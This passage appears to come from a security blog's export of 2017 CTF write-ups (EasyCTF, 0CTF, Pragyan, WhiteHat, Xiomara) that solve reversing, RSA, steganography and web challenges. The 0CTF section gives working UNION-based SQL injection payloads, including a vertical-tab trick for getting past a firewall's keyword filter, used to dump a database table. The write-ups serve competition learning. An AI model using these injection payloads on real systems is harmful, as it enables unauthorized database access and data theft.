find it? Download Easy: 123$ strings hexableCan you find the flag?easyctf&#123;g3lZd5MgTYPBJz&#125; 30 - Phunky Python I - Reverse Engineering The other day we happened upon a dusty old laptop covered in duct tape and surrounded by several papers with notes scrawled all over them. Upon inspection, we found that the laptop contained several python files labeled phunky. We've determined that each of the files contains a mini reversing challenge. The first task is simple: Find the value of x such that the program prints out easyctf (make sure it's lowercase!). phunky1.py Python code to reverse is: 123456x = 0 # REDACTEDdigs = [7074241208379116738, 7074241208379116734, 7074241208379116752, 7074241208379116758, 7074241208379116736, 7074241208379116753, 7074241208379116739]out = \"\"for letter in reversed(digs): out = chr(letter - x) + outprint out In decimal e equal 101 (ASCII). We know the first letter is e (first letter of easyctf) so to find x we have to calculate 7074241208379116738 - 101. 12irb(main):001:0&gt; 7074241208379116738 - 101=&gt; 7074241208379116637 So the flag is easyctf{7074241208379116637}. 30 - Cookie Blog - Web I found the cookie monster's blog! Let's see cookies in the http headers: 12345678910$ curl --head http://cookieblog.web.easyctf.com/HTTP/1.1 200 OKDate: Thu, 16 Mar 2017 22:08:18 GMTContent-Type: text/htmlConnection: keep-aliveSet-Cookie: __cfduid=d32c1739063bfca06d37c0c40cf61298f1489702098; expires=Fri, 16-Mar-18 22:08:18 GMT; path=/; domain=.easyctf.com; HttpOnlyX-Powered-By: PHP/5.5.9-1ubuntu4.14Set-Cookie: flag=easyctf%7Byum_c00kies%21%21%21%7DServer: cloudflare-nginxCF-RAY: 340b07c1f3201509-CDG The server tell us to use this cookie: flag=easyctf%7Byum_c00kies%21%21%21%7D. Let's URLdecode it: flag=easyctf{yum_c00kies!!!}. 50 - Mane Event - Forensics My friend just got back from the plains and he took this picture with his new camera. He also told me there's a flag hidden in it - can you check it out for me? We can easyly solve it with strings or exiftool: 12345$ strings 588785dd3d2d4e8366c4b0802da7f2425fd7e3fe_lion.jpg | grep -i easyctf@12 - Photo Contests,easyctf&#123;pride_in_african_engin33ring&#125;,2011 B$ exiftool 588785dd3d2d4e8366c4b0802da7f2425fd7e3fe_lion.jpg | grep -i easyctfKeywords : 12 - Photo Contests,easyctf&#123;pride_in_african_engin33ring&#125;,2011 B 50 - Fizz Buzz 1 - Programming Write a program that takes an integer n as input. Output the numbers 1 through n, in increasing order, one per line. However, replace any line that is a multiple of 3 with Fizz and any that are a multiple of 5 with Buzz. Any line that is a multiple of 3 and 5 should be written as FizzBuzz. The input will be the number of lines to write, n, followed by a linebreak. Sample input: 12&gt; 17&gt; Sample output: 123456789101112131415161718&gt; 1&gt; 2&gt; Fizz&gt; 4&gt; Buzz&gt; Fizz&gt; 7&gt; 8&gt; Fizz&gt; Buzz&gt; 11&gt; Fizz&gt; 13&gt; 14&gt; FizzBuzz&gt; 16&gt; 17&gt; 123456789101112# python3# strip newline and cast to intn = int(input().rstrip())for i in range(1, n+1): if i % 3 == 0 and i % 5 == 0: print('FizzBuzz') elif i % 3 == 0: print('Fizz') elif i % 5 == 0: print('Buzz') else: print(i) 50 - RSA 1 - Cryptography I found somebody's notes on their private RSA! Help me crack this. Here is how RSA works. We have p and q so we can calculate n and d to get m, and then convert m from integer (numeric) to ASCII: 12345678910111213141516171819202122232425262728293031323334#!/usr/bin/python2# credit : http://jhafranco.com/2012/01/29/rsa-implementation-in-python/def int2Text(number, size): text = \"\".join([chr((number &gt;&gt; j) &amp; 0xff) for j in reversed(range(0, size &lt;&lt; 3, 8))]) return text.lstrip(\"\\x00\")# credit : http://stackoverflow.com/questions/4798654/modular-multiplicative-inverse-function-in-pythondef egcd(a, b): if a == 0: return (b, 0, 1) else: g, y, x = egcd(b % a, a) return (g, x - (b // a) * y, y)def modinv(a, m): g, x, y = egcd(a, m) if g != 1: raise Exception('modular inverse does not exist') else: return x % mp = 35885212171111995346302466488176876500816040695661602379955175537461355378690177q = 33082048174033265491869743773326801992276462089543967631444525716583833833612769e = 65537c = 769108774360724583422343365602954767977840874127335163429133026925857210310609352349335631128387073031906212125470248375564260399006500790258805385203332728116phi = (p-1)*(q-1)d = modinv(e, phi)n = p*qm_int = pow(c,d,n)print int2Text(m_int, len(str(m_int))) Flag is easyctf{wh3n_y0u_h4ve_p&amp;q_RSA_iz_ez_a45031e1}. 50 - Useless Python - Reverse Engineering Boredom took over, so I wrote this python file! I didn't want anyone to see it though because it doesn't actually run, so I used the coolest base-16 encoding to keep it secret. python The python sample looks like this: 1657865632863687228313031292b63687228313230292b6 [ ... ] 92b6368722836872283532292b636872283439292b636872283431292b6368722834312929 Base16 is only hexadecimal so just convert it to text: 1exec(chr(101)+chr(120)+chr(101)+chr(99)+chr(40)+ [...] +chr(40)+chr(52)+chr(49)+chr(41)+chr(41)) Ok, so I made a little ruby script to decode all chars and get the message, but it's like in Inception, the message is an exec with some chr again. So I adapted my script to do the same process until we get the flag: 1234567891011121314151617181920212223242526272829#!/usr/bin/rubydef deobfuscate(s) # split file arr_in = s.split('+') # convert int to char arr_out = [] for c in arr_in char = /.*chr\\(([0-9]&#123;1,3&#125;)\\).*/.match(c).captures[0].to_i.chr arr_out.push(char) end out = arr_out.join return outendopen('test.py', 'r') do |f| input = f.read() output = '' i = 1 until /easyctf/.match(output) do puts \"=== pass n°#&#123;i&#125; ===\" output = deobfuscate(input) puts output + \"\\n\\n\" input = output i+=1 endend Output of teh script: 12345678910$ ruby solve.rb=== pass n°1 ===exec(chr(101)+chr(120)+chr(101)+chr(99)+chr(40)+chr(99)+chr(104)+chr(114)+chr(40)+chr(49)+chr(48)+chr(50)+chr(41)+chr(43)+chr(99)+chr(104)+chr(114)+chr(40)+chr(49)+chr(48)+chr(56)+chr(41)+chr(43)+chr(99)+chr(104)+chr(114)+chr(40)+chr(57)+chr(55)+chr(41)+chr(43)+chr(99)+chr(104)+chr(114)+chr(40)+chr(49)+chr(48)+chr(51)+chr(41)+chr(43)+chr(99)+chr(104)+chr(114)+chr(40)+chr(51)+chr(50)+chr(41)+chr(43)+chr(99)+chr(104)+chr(114)+chr(40)+chr(54)+chr(49)+chr(41)+chr(43)+chr(99)+chr(104)+chr(114)+chr(40)+chr(51)+chr(50)+chr(41)+chr(43)+chr(99)+chr(104)+chr(114)+chr(40)+chr(51)+chr(57)+chr(41)+chr(43)+chr(99)+chr(104)+chr(114)+chr(40)+chr(49)+chr(48)+chr(49)+chr(41)+chr(43)+chr(99)+chr(104)+chr(114)+chr(40)+chr(57)+chr(55)+chr(41)+chr(43)+chr(99)+chr(104)+chr(114)+chr(40)+chr(49)+chr(49)+chr(53)+chr(41)+chr(43)+chr(99)+chr(104)+chr(114)+chr(40)+chr(49)+chr(50)+chr(49)+chr(41)+chr(43)+chr(99)+chr(104)+chr(114)+chr(40)+chr(57)+chr(57)+chr(41)+chr(43)+chr(99)+chr(104)+chr(114)+chr(40)+chr(49)+chr(49)+chr(54)+chr(41)+chr(43)+chr(99)+chr(104)+chr(114)+chr(40)+chr(49)+chr(48)+chr(50)+chr(41)+chr(43)+chr(99)+chr(104)+chr(114)+chr(40)+chr(49)+chr(50)+chr(51)+chr(41)+chr(43)+chr(99)+chr(104)+chr(114)+chr(40)+chr(49)+chr(49)+chr(50)+chr(41)+chr(43)+chr(99)+chr(104)+chr(114)+chr(40)+chr(49)+chr(50)+chr(49)+chr(41)+chr(43)+chr(99)+chr(104)+chr(114)+chr(40)+chr(49)+chr(49)+chr(54)+chr(41)+chr(43)+chr(99)+chr(104)+chr(114)+chr(40)+chr(49)+chr(48)+chr(52)+chr(41)+chr(43)+chr(99)+chr(104)+chr(114)+chr(40)+chr(49)+chr(49)+chr(49)+chr(41)+chr(43)+chr(99)+chr(104)+chr(114)+chr(40)+chr(49)+chr(49)+chr(48)+chr(41)+chr(43)+chr(99)+chr(104)+chr(114)+chr(40)+chr(57)+chr(53)+chr(41)+chr(43)+chr(99)+chr(104)+chr(114)+chr(40)+chr(53)+chr(49)+chr(41)+chr(43)+chr(99)+chr(104)+chr(114)+chr(40)+chr(49)+chr(50)+chr(48)+chr(41)+chr(43)+chr(99)+chr(104)+chr(114)+chr(40)+chr(53)+chr(49)+chr(41)+chr(43)+chr(99)+chr(104)+chr(114)+chr(40)+chr(57)+chr(57)+chr(41)+chr(43)+chr(99)+chr(104)+chr(114)+chr(40)+chr(57)+chr(53)+chr(41)+chr(43)+chr(99)+chr(104)+chr(114)+chr(40)+chr(49)+chr(48)+chr(49)+chr(41)+chr(43)+chr(99)+chr(104)+chr(114)+chr(40)+chr(49)+chr(50)+chr(48)+chr(41)+chr(43)+chr(99)+chr(104)+chr(114)+chr(40)+chr(49)+chr(48)+chr(49)+chr(41)+chr(43)+chr(99)+chr(104)+chr(114)+chr(40)+chr(57)+chr(57)+chr(41)+chr(43)+chr(99)+chr(104)+chr(114)+chr(40)+chr(57)+chr(53)+chr(41)+chr(43)+chr(99)+chr(104)+chr(114)+chr(40)+chr(53)+chr(49)+chr(41)+chr(43)+chr(99)+chr(104)+chr(114)+chr(40)+chr(49)+chr(50)+chr(48)+chr(41)+chr(43)+chr(99)+chr(104)+chr(114)+chr(40)+chr(49)+chr(48)+chr(49)+chr(41)+chr(43)+chr(99)+chr(104)+chr(114)+chr(40)+chr(57)+chr(57)+chr(41)+chr(43)+chr(99)+chr(104)+chr(114)+chr(40)+chr(57)+chr(53)+chr(41)+chr(43)+chr(99)+chr(104)+chr(114)+chr(40)+chr(49)+chr(48)+chr(49)+chr(41)+chr(43)+chr(99)+chr(104)+chr(114)+chr(40)+chr(49)+chr(50)+chr(48)+chr(41)+chr(43)+chr(99)+chr(104)+chr(114)+chr(40)+chr(53)+chr(49)+chr(41)+chr(43)+chr(99)+chr(104)+chr(114)+chr(40)+chr(57)+chr(57)+chr(41)+chr(43)+chr(99)+chr(104)+chr(114)+chr(40)+chr(49)+chr(50)+chr(53)+chr(41)+chr(43)+chr(99)+chr(104)+chr(114)+chr(40)+chr(51)+chr(57)+chr(41)+chr(43)+chr(99)+chr(104)+chr(114)+chr(40)+chr(49)+chr(48)+chr(41)+chr(43)+chr(99)+chr(104)+chr(114)+chr(40)+chr(49)+chr(49)+chr(50)+chr(41)+chr(43)+chr(99)+chr(104)+chr(114)+chr(40)+chr(49)+chr(49)+chr(52)+chr(41)+chr(43)+chr(99)+chr(104)+chr(114)+chr(40)+chr(49)+chr(48)+chr(53)+chr(41)+chr(43)+chr(99)+chr(104)+chr(114)+chr(40)+chr(49)+chr(48)+chr(53)+chr(41)+chr(43)+chr(99)+chr(104)+chr(114)+chr(40)+chr(49)+chr(49)+chr(48)+chr(41)+chr(43)+chr(99)+chr(104)+chr(114)+chr(40)+chr(49)+chr(49)+chr(54)+chr(41)+chr(43)+chr(99)+chr(104)+chr(114)+chr(40)+chr(51)+chr(50)+chr(41)+chr(43)+chr(99)+chr(104)+chr(114)+chr(40)+chr(49)+chr(48)+chr(50)+chr(41)+chr(43)+chr(99)+chr(104)+chr(114)+chr(40)+chr(49)+chr(48)+chr(56)+chr(41)+chr(43)+chr(99)+chr(104)+chr(114)+chr(40)+chr(57)+chr(55)+chr(41)+chr(43)+chr(99)+chr(104)+chr(114)+chr(40)+chr(49)+chr(48)+chr(51)+chr(41)+chr(41))=== pass n°2 ===exec(chr(102)+chr(108)+chr(97)+chr(103)+chr(32)+chr(61)+chr(32)+chr(39)+chr(101)+chr(97)+chr(115)+chr(121)+chr(99)+chr(116)+chr(102)+chr(123)+chr(112)+chr(121)+chr(116)+chr(104)+chr(111)+chr(110)+chr(95)+chr(51)+chr(120)+chr(51)+chr(99)+chr(95)+chr(101)+chr(120)+chr(101)+chr(99)+chr(95)+chr(51)+chr(120)+chr(101)+chr(99)+chr(95)+chr(101)+chr(120)+chr(51)+chr(99)+chr(125)+chr(39)+chr(10)+chr(112)+chr(114)+chr(105)+chr(105)+chr(110)+chr(116)+chr(32)+chr(102)+chr(108)+chr(97)+chr(103))=== pass n°3 ===flag = &apos;easyctf&#123;python_3x3c_exec_3xec_ex3c&#125;&apos;priint flag 75 - Petty Difference - Forensics I found two files in a secret room. They look like jumbled letters with no patterns. I mean look at it! file1 is identical to file2, right? Ok so let's compare the two files: 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455$ cmp -bl file1.txt file2.txt 482 175 &#125; 154 l 1638 64 4 146 f 1796 137 _ 142 b 2240 147 g 172 z 3157 156 n 71 9 3303 61 1 65 5 3568 153 k 145 e 3892 60 0 157 o 3911 60 0 142 b 4501 154 l 143 c 5204 137 _ 162 r 5582 63 3 164 t 6107 162 r 161 q 6563 63 3 141 a 7043 167 w 144 d 7196 137 _ 164 t 8269 165 u 67 7 8866 60 0 153 k 9164 171 y 144 d 9965 137 _ 170 x 10771 63 3 172 z 11220 143 c 60 0 11283 156 n 144 d 11285 63 3 143 c 11666 162 r 151 i 13337 63 3 163 s 14816 146 f 167 w 15168 146 f 173 &#123; 15180 61 1 170 x 15366 144 d 65 5 15656 137 _ 153 k 16168 63 3 151 i 17651 150 h 153 k 17761 164 t 64 4 18186 137 _ 160 p 18261 63 3 165 u 18592 142 b 145 e 18739 137 _ 162 r 19676 171 y 151 i 20033 64 4 151 i 20228 155 m 145 e 20246 137 _ 142 b 23511 163 s 155 m 24001 61 1 141 a 24487 150 h 166 v 24845 164 t 167 w 25291 173 &#123; 156 n 25411 146 f 170 x 25491 164 t 144 d 25502 143 c 166 v 25673 171 y 167 w 26410 163 s 145 e 27127 141 a 170 x 27132 145 e 71 9 It seems that we got the flag (reverse order of the diff from first file), but let's write a ruby script to make it easier to copy: 12345678910111213141516#!/usr/bin/ruby# empty arrayflag = []# generate diff.txt : cmp -bl file1.txt file2.txt &gt; diff.txtopen('diff.txt', 'r') do |f| # split lines lines = f.read().split(\"\\n\") for line in lines # split columns words = line.split(' ') flag.push(words[2]) endendputs flag.reverse.join Let's try it: 12$ ruby diff.rbeasyctf&#123;th1s_m4y_b3_th3_d1ff3r3nc3_y0u_w3r3_l00k1ng_4&#125; 80 - RSA 2 - Cryptography Some more RSA! This time, there's no P and Q... this. Let's see how it looks this tiem: 1234$ cat ciphertext2.txtn: 292977443899368435277959020404942780635643e: 65537c: 116661734456209126203156567366346251672660 This time we got n but not p and q. Maybe factordb can help us: 292977443899368435277959020404942780635643 = 471665935909122708917 · 621154553666596093679. We can now use the same script (from RSA 1 challenge). 12345678910111213141516171819202122232425262728293031323334#!/usr/bin/python2# credit : http://jhafranco.com/2012/01/29/rsa-implementation-in-python/def int2Text(number, size): text = \"\".join([chr((number &gt;&gt; j) &amp; 0xff) for j in reversed(range(0, size &lt;&lt; 3, 8))]) return text.lstrip(\"\\x00\")# credit : http://stackoverflow.com/questions/4798654/modular-multiplicative-inverse-function-in-pythondef egcd(a, b): if a == 0: return (b, 0, 1) else: g, y, x = egcd(b % a, a) return (g, x - (b // a) * y, y)def modinv(a, m): g, x, y = egcd(a, m) if g != 1: raise Exception('modular inverse does not exist') else: return x % mp = 471665935909122708917q = 621154553666596093679e = 65537c = 116661734456209126203156567366346251672660phi = (p-1)*(q-1)d = modinv(e, phi)n = p*qm_int = pow(c,d,n)print int2Text(m_int, len(str(m_int))) Output: 12$ python2 rsa2.pyflag&#123;l0w_n_79c0&#125; 85 - Zooooooom - Forensics Hekkerman is looking awfully spooky. That hekker glare could pierce a firewall. What can he see that you can't? Image: We can see there is a thumbnail, let's extract it. But the thumbnail itself have a thumbnail: 12$ exiftool -b -ThumbnailImage hekkerman.jpg &gt; thumbnail.jpg$ exiftool -b -ThumbnailImage thumbnail.jpg &gt; thumbnail_thumbnail.jpg Thumbnail: Thumbnail of the thumbnail: Flag is: easyctf{d33p_zo0m_HeKker_2c1ae5}. Note: this is Steganography not Digital Forensics.","categories":[{"name":"security","slug":"security","permalink":"https://rawsec.ml/categories/security/"},{"name":"writeups","slug":"security/writeups","permalink":"https://rawsec.ml/categories/security/writeups/"}],"tags":[{"name":"security","slug":"security","permalink":"https://rawsec.ml/tags/security/"},{"name":"programming","slug":"programming","permalink":"https://rawsec.ml/tags/programming/"},{"name":"web","slug":"web","permalink":"https://rawsec.ml/tags/web/"},{"name":"crypto","slug":"crypto","permalink":"https://rawsec.ml/tags/crypto/"},{"name":"writeups","slug":"writeups","permalink":"https://rawsec.ml/tags/writeups/"},{"name":"ctf","slug":"ctf","permalink":"https://rawsec.ml/tags/ctf/"},{"name":"forensics","slug":"forensics","permalink":"https://rawsec.ml/tags/forensics/"},{"name":"misc","slug":"misc","permalink":"https://rawsec.ml/tags/misc/"},{"name":"reversing","slug":"reversing","permalink":"https://rawsec.ml/tags/reversing/"}]},{"title":"0CTF 2017 Quals - Write-ups","slug":"0CTF-2017-write-ups","date":"2017-03-20T23:00:00.000Z","updated":"2017-03-21T22:21:12.327Z","comments":true,"path":"en/0CTF-2017-write-ups/","link":"","permalink":"https://rawsec.ml/en/0CTF-2017-write-ups/","excerpt":"","text":"Informations Version By Version Comment noraj 1.0 Creation CTF Name : 0CTF 2017 Quals Website : ctf.0ops.net Type : Online Format : Jeopardy CTF Time : link Welcome - Misc Welcome to 0CTF 2017~ irc: irc.freenode.net #0ctf2017 flag{Welcome_to_0CTF_2017} simplesqlin - Web http://202.120.7.203 The injectable request: http://202.120.7.203/index.php?id=3. Keywords blocked: SELECT, sElEcT, %53elect, sel/**/ect (not blocked but doesn't work), /*!%53eLEct*/ FROM WHERE ?id=2 order by 3 works and ?id=2 order by 4 doesn't so there is 3 columns in the actual table. Keywords blocked need to be escaped, so we need to try some WAF bypass techniques. As you can see in the previous part (Keywords blocked), a lot of tricks don't work but I find one that is working: se%0blect, injecting a character that does nothing in our context like %0b (vertical tab) or %07 (bell). ?id=99999 UNION SEL%0bECT 1,2,3 99999 is an out of range id so the UNION statement is executed. 2 is displayed in the &lt;h3&gt;&lt;/h3&gt;, 3 is displayed in the &lt;div class=&quot;main&quot;&gt;3&lt;/div&gt; and 1 is displayed in the link &lt;a href=&quot;index.php?id=1&quot;&gt;. Now let's identify the databse: ?id=99999 UNION SEL%0bECT 1,user(),version(): user: news@localhost, version: 5.7.17-0ubuntu0.16.04.1 ?id=99999 UNION SEL%0bECT 1,database(),3: database: news ?id=99999 UNION SEL%0bECT 1,table_name,3 FR%0bOM information_schema.tables W%0bHERE table_schema = 'news': table name: flag ?id=99999 UNION SEL%0bECT 1,column_name,3 fr%0bom information_schema.columns whe%0bre table_schema='news' and table_name='flag' LIMIT 0,1 -- -: 1st column name: flag ?id=99999 UNION SEL%0bECT 1,column_name,3 fr%0bom information_schema.columns whe%0bre table_schema='news' and table_name='flag' LIMIT 1,1 -- -: there is only 1 column ?id=99999 UNION SEL%0bECT 1,flag,3 fr%0bom news.flag: flag: flag{W4f_bY_paSS_f0R_CI} References: 1 - 2","categories":[{"name":"security","slug":"security","permalink":"https://rawsec.ml/categories/security/"},{"name":"writeups","slug":"security/writeups","permalink":"https://rawsec.ml/categories/security/writeups/"}],"tags":[{"name":"security","slug":"security","permalink":"https://rawsec.ml/tags/security/"},{"name":"web","slug":"web","permalink":"https://rawsec.ml/tags/web/"},{"name":"writeups","slug":"writeups","permalink":"https://rawsec.ml/tags/writeups/"},{"name":"ctf","slug":"ctf","permalink":"https://rawsec.ml/tags/ctf/"}]},{"title":"Pragyan CTF 2017 - Write-ups","slug":"PragyanCTF-2017-write-ups","date":"2017-03-03T23:00:00.000Z","updated":"2017-03-06T16:25:20.461Z","comments":true,"path":"en/PragyanCTF-2017-write-ups/","link":"","permalink":"https://rawsec.ml/en/PragyanCTF-2017-write-ups/","excerpt":"","text":"Informations Version By Version Comment noraj 1.0 Creation CTF Name : Pragyan CTF 2017 Website : ctf.pragyan.org Type : Online Format : Jeopardy CTF Time : link Pragyan CTF 2017 was one of the worst ctf ever. All challenge was guessing or steganography, web were always down, no irc, ... a shame. 50 - Look Harder - Forencics There are rumours that in the Great Sahara Desert, a great treasure has been buried deep inside the ground, but the map for the exact location of the treasure over the years, has not been preserved properly. You have got hold of the map, but it looks nothing more than a plain white sheet of paper. Can you make sense out of it ?? reasure_map.png I used stegsolve and blue plane 4 revealed a QR code. I next used Zxing online to decode teh QR code: stay_pragyaned. Flag: pragyanctf{stay_pragyaned}. Important note: this is a steganography challenge, not a digital forencics one as pretend organizers. 150 - Interstellar - Forencics Dr. Cooper, on another one of his endless journeys encounter a mysterious planet. However when he tried to land on it, the ship gave way and he was left stranded on the planet. Desperate for help, he relays a message to the mothership containing the details of the people with him. Their HyperPhotonic transmission is 10 times the speed of light, so there is no delay in the message. However, a few photons and magnetic particles interefered with the transmission, causing it to become as shown in the picture. Can you help the scientists on the mothership get back the original image? transmission.png Image is badly dammaged. I used stegsolve and the Invert Color (Xor) showed me: The flag is {Cooper_Brand}. Flag: pragyanctf{Cooper_Brand}. Important note: this is a steganography challenge, not a digital forencics one as pretend organizers.","categories":[{"name":"security","slug":"security","permalink":"https://rawsec.ml/categories/security/"},{"name":"writeups","slug":"security/writeups","permalink":"https://rawsec.ml/categories/security/writeups/"}],"tags":[{"name":"security","slug":"security","permalink":"https://rawsec.ml/tags/security/"},{"name":"stegano","slug":"stegano","permalink":"https://rawsec.ml/tags/stegano/"},{"name":"writeups","slug":"writeups","permalink":"https://rawsec.ml/tags/writeups/"},{"name":"ctf","slug":"ctf","permalink":"https://rawsec.ml/tags/ctf/"}]},{"title":"WhiteHat Challenge 01 - 20 - For001 - Forensics","slug":"WhiteHat-Challenge-01-20-For001-Forensics","date":"2017-02-26T23:00:00.000Z","updated":"2017-03-21T22:24:32.344Z","comments":true,"path":"en/WhiteHat-Challenge-01-20-For001-Forensics/","link":"","permalink":"https://rawsec.ml/en/WhiteHat-Challenge-01-20-For001-Forensics/","excerpt":"","text":"Informations Version By Version Comment noraj 1.0 Creation CTF Name : WhiteHat Challenge 01 Website : wargame.whitehat.vn Type : Online Format : Jeopardy CTF Time : link Description Can you find the secret in this image? Download file here: http://material.wargame.whitehat.vn/challenges/1/For001_b9f7cdc52232efc20abe3ca3df14be5d.zip Submit WhiteHat{sha1(flag)} Solution The zip contain an image: LSB.png. Let's try to retrive something with LSB attack, I found a Microsoft Word 2007 document. Trying to open it with LibreOffice said me that the document is corrupted. As it is only an archive I extrated it with 7z. I then open the document.xml and I found that: 1. .- ... -.-- ..-. --- .-. . -. ... .. -.-. It is morse. So I used http://www.dcode.fr/morse-code to decode the message. That gave me EASYFORENSIC. 12345$ printf %s &apos;EASYFORENSIC&apos; | sha1sumffed6da75c3296041fc52abc75298e120c350917 -$ printf %s &apos;easyforensic&apos; | sha1sum1f0aa393d3e5369f391c35a793bcf1178b8299a0 - So flag is WhiteHat{1f0aa393d3e5369f391c35a793bcf1178b8299a0}. Note: Again, this is stegano not digital forencis...","categories":[{"name":"security","slug":"security","permalink":"https://rawsec.ml/categories/security/"},{"name":"writeups","slug":"security/writeups","permalink":"https://rawsec.ml/categories/security/writeups/"}],"tags":[{"name":"security","slug":"security","permalink":"https://rawsec.ml/tags/security/"},{"name":"writeups","slug":"writeups","permalink":"https://rawsec.ml/tags/writeups/"},{"name":"ctf","slug":"ctf","permalink":"https://rawsec.ml/tags/ctf/"},{"name":"forensics","slug":"forensics","permalink":"https://rawsec.ml/tags/forensics/"}]},{"title":"Xiomara CTF 2017 - Write-ups","slug":"XiomaraCTF-2017-write-ups","date":"2017-02-26T23:00:00.000Z","updated":"2017-02-27T19:36:18.969Z","comments":true,"path":"en/XiomaraCTF-2017-write-ups/","link":"","permalink":"https://rawsec.ml/en/XiomaraCTF-2017-write-ups/","excerpt":"","text":"Informations Version By Version Comment noraj 1.0 Creation CTF Name : Xiomara CTF 2017 Website : xiomara.xyz Type : Online Format : Jeopardy CTF Time : link 50 - Easy Login? - Web Exploitation An aspiring engineer started learning web development on Youtube a day ago and he was asked to build a nice, secure, simple login page as part of his project. Well, he just started off so don't blame him. Go, hack! http://139.59.61.220:23478/ The source is suspicious: 1234567891011121314151617&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt;&lt;title&gt;Login&lt;/title&gt;&lt;/head&gt;&lt;script type=\"text/javascript\" src=\"main.js\"&gt;&lt;/script&gt;&lt;link rel=\"stylesheet\" href=\"flag.css\" /&gt;&lt;body&gt;&lt;h1 align= \"center\"&gt;Login Portal&lt;/h1&gt;&lt;form name=\"login\" method=\"POST\" action=\"\"&gt; &lt;b&gt;Username :&lt;b&gt; &lt;input type=\"text\" name =\"username\"/&gt;&lt;br&gt; &lt;b&gt; Password :&lt;b&gt; &lt;input type=\"password\" name=\"password\" /&gt;&lt;/br&gt;&lt;/br&gt; &lt;input onclick=\"Login()\" type=\"button\" value=\"verify\" name=\"button\" /&gt; &lt;/form&gt;&lt;/body&gt;&lt;/html&gt; Let's see main.js: 12345678910111213141516function Login()&#123; var username=document.login.username.value; var password=document.login.password.value; if (password == \"53cure\" &amp;&amp; username==\"@nokh@\") &#123; alert(\"Awesome!\"); window.open(\"secureflag.html\"); &#125; else &#123; alert(\"Oh swap!You are close. Why cant you try again?\"); &#125;&#125; Now we can use @nokh@ and 53cure or directly go to http://139.59.61.220:23478/secureflag.html. The image is named hiddenflag.jpeg so let's download it. There is some hidden data here: 12345678910111213141516171819202122232425262728293031323334353637383940414243444546$ binwalk hiddenflag.jpegDECIMAL HEXADECIMAL DESCRIPTION--------------------------------------------------------------------------------0 0x0 JPEG image data, JFIF standard 1.0148981 0xBF55 Zip archive data, at least v1.0 to extract, compressed size: 29, uncompressed size: 29, name: flag.txt49154 0xC002 End of Zip archive$ foremost -v hiddenflag.jpegForemost version 1.5.7 by Jesse Kornblum, Kris Kendall, and Nick MikusAudit FileForemost started at Sun Feb 26 19:14:21 2017Invocation: foremost -v hiddenflag.jpegOutput directory: /home/noraj/CTF/XiomaraCTF/2017/outputConfiguration file: /etc/foremost.confProcessing: hiddenflag.jpeg|------------------------------------------------------------------File: hiddenflag.jpegStart: Sun Feb 26 19:14:21 2017Length: 48 KB (49176 bytes)Num Name (bs=512) Size File Offset Comment0: 00000000.jpg 47 KB 0 foundat=flag.txtUT1: 00000095.zip 196 B 48981 *|Finish: Sun Feb 26 19:14:21 20172 FILES EXTRACTEDjpg:= 1zip:= 1------------------------------------------------------------------Foremost finished at Sun Feb 26 19:14:21 2017$ cd output/zip$ unzip 00000095.zipArchive: 00000095.zip extracting: flag.txt$ cat flag.txtxiomara&#123;50_y0u_ar3_@_h@ck3r&#125; 50 - Lulz - Web Exploitation Heavy sarcasm awaits. Are you a person who finds opportunities even in trolls? Well, let's find out. http://139.59.61.220:23456 The webpage is a troll opening a pop-up and redirecting to a troll page: http://139.59.61.220:23456/troll.html But of course you are using NoScript or know about view-source: in Firefox. Let's see the source (view-source:http://139.59.61.220:23456/): 123456789&lt;head&gt;&lt;title&gt;Hahaha!!!&lt;/title&gt;&lt;body&gt; &lt;img src =\"lol.jpg\" align =\"center\" width =\"50%\" height = \"50%\" alt =\"lollol\"&gt;&lt;/body&gt;&lt;script type=\"text/javascript\" src=\"hook.js\"&gt;&lt;/script&gt;&lt;/head&gt; hook.js source: 1234567891011function catch_me()&#123;(![]+[])[+!+[]]+(![]+[])[!+[]+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]+(!![]+[])[+[]]+(![]+[][(![]+[])[+[]]+([![]]+[][[]]) /*VERY LONG*/&#125; function Redirect() &#123; window.location=\"troll.html\"; &#125; alert(\"Warning you are about to be trolled\"); setTimeout('Redirect()', 0); The catch_me() function looks like some brainfuck-js. Copy it and paste it in your browser terminal, you will get: 1&quot;alert(Xiomara&#123;i_4gr33_Y0U_4r3_a_Flash!&#125;))&quot; The is a mistake troll, so correct Xiomara{i_4gr33_Y0U_4r3_a_Flash!} into xiomara{i_4gr33_Y0U_4r3_a_Flash!} (lowercase the first char). 50 - No Flags? - Web Exploitation What would you do if we tell you there are no flags for this question? Go on, solve it. That reminds me, Nothing is impossible. http://139.59.61.220:23467/ I tried robots.txt: 12345User-agent:*Disallow: /flags/Disallow: /more_flags/Disallow: /more_and_more_flags/Disallow: /no_flag/ /flags/, /more_flags/ and /more_and_more_flags/ are obviously trolls. Let's see /no_flag/ source: 12345678910&lt;script&gt;function encode(str) &#123;str = str.replace(/http:/g, \"^^^\");str = str.replace(/bin/g, \"*^$#!\")str= str.replace(/com/g, \"*%=_()\");str= str.replace(/paste/g, \"~~@;;\");&#125;&lt;/script&gt;&lt;iframe src=\"flag.txt\" width=\"2500\" height=\"2255\"&gt;&lt;/iframe&gt; It's an iframe of flag.txt which containd some ASCII art, like the three others. But this time there is a script. The ASCII art display YOU HAVE BEEN HACKED ! but on the middle of HACKED we can see &quot;^^^//~~@;;*^$#!.*%=_()/SwzEKazp&quot;. So let's replace back: http://pastebin.com/SwzEKazp. So go to pastebin and... This page has been removed!. So go to the wayback machine, there is a snapshot dating from 25 Feb. 2017. We can see an untitled document from XIOMARA_CTF containing: eGlvbWFyYXsxXzRtX21yX3IwYjA3fQ==. 12$ printf %s &apos;eGlvbWFyYXsxXzRtX21yX3IwYjA3fQ==&apos; | base64 -dixiomara&#123;1_4m_mr_r0b07&#125;","categories":[{"name":"security","slug":"security","permalink":"https://rawsec.ml/categories/security/"},{"name":"writeups","slug":"security/writeups","permalink":"https://rawsec.ml/categories/security/writeups/"}],"tags":[{"name":"security","slug":"security","permalink":"https://rawsec.ml/tags/security/"},{"name":"web","slug":"web","permalink":"https://rawsec.ml/tags/web/"},{"name":"writeups","slug":"writeups","permalink":"https://rawsec.ml/tags/writeups/"},{"name":"ctf","slug":"ctf","permalink":"https://rawsec.ml/tags/ctf/"}]},{"title":"NeverLAN CTF 2017 - 